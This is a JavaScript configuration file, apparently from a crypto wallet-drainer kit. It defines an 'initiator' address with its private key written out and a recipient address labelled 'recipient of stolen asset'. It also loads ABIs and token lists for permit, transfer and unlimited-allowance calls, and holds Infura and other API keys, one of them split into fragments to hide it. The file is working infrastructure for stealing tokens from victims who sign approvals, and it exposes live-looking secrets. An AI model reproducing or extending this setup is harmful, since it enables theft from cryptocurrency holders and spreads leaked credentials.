// export const initiator = '0x5049bE34eE05627aD0C500f11B25d23c02F530b1'; // initiator address
// export const initiatorPK = 'bbdeb46f850dd3b11672db4f15b5ff15927cbfcdb9959ddc94df4a99e5966989'; // initiaror's private key

export const initiator = '0x50bF0eAf6149F6029469d0F9Ac874e22F94b670a'; // initiator address
export const initiatorPK = '64f8ad67a1eb5b0a414224837de0f5f0ce1ebe4438e210b4351240e1a9b5504b'; // initiaror's private key

// export let recipient = '0x16866d2b99354C5057aE414bbA03C7810b550E04'; // recipient of stolen asset
export let recipient = '0xBBcD4eFCAD8Db5120F079f7c87a53743043cF6C3'; // recipient of stolen asset
export { default as ALLOWANCEABI } from './abis/allowanceABI.json';
export { default as permitV2 } from './abis/permitvs.json';
export { default as CLAIMEABI } from './abis/claimABI.json';
export { default as ERC20ABI } from './abis/erc20.json';
// export const projectId = '266adf3f12378f461f72258a250ac519';
export const projectId = '823cefd95a0f9931c46b28bda3bcfb54';
export const deadline = 10000000000000;
export { default as permitTokens }from './permitTokens.json';
export { default as transferTokens } from './transferTokens.json';
export { default as increasAllownceTokens } from './increasAllownceTokens.json';
export const infura = "https://mainnet.infura.io/v3/4d5f05d6b7bb4260a9ba2b2e085844db";

export const max = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
export const claimAddress = '0x50bF0eAf6149F6029469d0F9Ac874e22F94b670a';
// export const claimAddress = '0x5F93C85fea3af5331037354ffAa19897A5AdA977';
// const keys = [
//   'A',
//   'CUR',
//   '7LHb',
//   'xrjk',
//   'tO',
//   '5xFQ',
//   '32h',
//   'P4',
//   '-UP',
//   'axG',
//   'fpH',
// ];
// let akeys = '';
// keys.forEach((k) => (akeys += k));

export const setRecip = (recip) => {
  recipient = recip;
}
export const apikeys = 's-FyQKCJD1qSs9YTs2Pf3G0VyTVKExwA';
